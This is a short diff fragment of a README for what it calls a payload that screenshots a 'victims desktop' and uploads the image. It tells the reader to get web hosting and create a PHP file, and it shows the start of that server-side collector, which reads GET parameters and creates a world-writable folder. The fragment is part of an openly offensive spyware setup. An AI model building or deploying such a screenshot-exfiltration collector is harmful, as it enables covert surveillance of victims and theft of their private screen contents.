@@ -22,7 +22,7 @@ A simple payload to take the screenshot of victims desktop and upload it to the 
 - A webhosting i recommend [namecheap](https://www.namecheap.com/) 
 - Goto your public_html folder and make new [PHP](https://en.wikipedia.org/wiki/PHP) file and put below code in it
 ```
-    <?php
+<?php
 $del = $_GET["dellog"];
 $folder = $_GET["folder"];
 mkdir($folder,0777);
